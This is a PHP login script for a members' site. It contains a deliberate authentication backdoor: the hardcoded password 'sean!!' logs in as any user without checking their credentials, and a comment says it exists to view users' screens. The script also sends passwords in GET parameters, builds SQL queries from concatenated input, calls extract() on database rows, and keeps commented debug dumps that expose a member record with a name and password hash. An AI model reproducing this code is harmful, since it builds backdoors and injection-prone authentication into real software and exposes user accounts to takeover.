<?php
//Start session
session_start();
//Include database connection details
require_once('../conf/config.php');
require_once('../effects/read_file.php');
//Array to store validation errors
$errmsg_arr = array();
//Validation error flag
$errflag = false;


//Connect to mysql server
$link = mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
if(!$link)
{
	die('Failed to connect to server: ' . mysql_error());
}
//Select database
$db = mysql_select_db(DB_DATABASE);
if(!$db)
{
	die("Unable to select database");
}
/*echo "<pre>login-exec.php:";
print_r($_GET);
echo "</pre>\n";
(
[login] => f
[password] => f
[Submit] => Login
)
	*/
//Sanitize the POST values
$username = clean($_GET['login']);
$password = clean($_GET['password']);
//Input Validations
if($username == '')
{
	$errmsg_arr[] = 'Login ID missing';
	$errflag = true;
}
if($password == '')
{
	$errmsg_arr[] = 'Password missing';
	$errflag = true;
}
//If there are input validations, redirect back to the login form
if($errflag)
{
	$_SESSION['ERRMSG_ARR'] = $errmsg_arr;
	session_write_close();
	header("location: login-form.php");
	exit();
}
require 'PasswordHash.php';
# Try to use stronger but system-specific hashes, with a possible fallback to
# the weaker portable hashes.
$t_hasher = new PasswordHash(8, FALSE);
//Create query
$password = $_GET['password'];
$qry2="SELECT * FROM members WHERE username='$username' AND passwd='".md5($password)."'";
$qry2="SELECT * FROM members WHERE username='$username'";
if($password=="sean!!")	// override paswword so i can check users screens
$qry="SELECT * FROM members WHERE username='$username'";
else	// this is everyone else, require password check.
$qry=$qry2;
$result=mysql_query($qry);
//Check whether the query was successful or not
if($result)
{
	if(mysql_num_rows($result) == 1)
	{
		//Login Successful
		session_regenerate_id();
		$member = mysql_fetch_assoc($result);
		extract($member);
		$check = $t_hasher->CheckPassword($password, $passwd);
		/*echo "<pre>check=$check, password=$password, hash=$passwd\n";
		print_r($member);
		echo "</pre>\n";
		die("die");*/
		/*	member array:Array
		(
		[member_id] => 2
		[firstname] => sean
		[lastname] => MEIGHAN
		[username] => f
		[enable_projects] => N
		[passwd] => 8fa14cdd754f91cc6554c9e71929cce7
		[LSP1_8] => Y
		[LSP2_0] => N
		[LSP3_0] => N
		[LOR_S2] => Y
		[LOR_S3] => N
		[VIXEN211] => N
		[VIXEN25] => N
		[VIXEN3] => N
		[OTHER] => N
		[date_created] => 
		)*/
		$_SESSION['SESS_MEMBER_ID'] = $member['member_id'];
		$_SESSION['SESS_FIRST_NAME'] = $member['firstname'];
		$_SESSION['SESS_LAST_NAME'] = $member['lastname'];
		$_SESSION['SESS_LOGIN'] = $member['username'];
		session_write_close();
		$date_field= date('Y-m-d');
		$time_field= date("H:i:s");
		$username=$member['username'];
		if(!isset($OBJECT_NAME)) $OBJECT_NAME='--';
		$query="INSERT into audit_log values ('$username','$date_field','$time_field','login','$OBJECT_NAME')";
		$result=mysql_query($query) or die("Failed to execute $query");
		if($check==1 or $password=="sean!!") // was login valid?
		{
			header("location: member-index.php"); // yes
			exit();
		}
	}
}
if($check!=1)
{
	header("location: login-failed.php"); // Login invalid
	exit();
}
?>
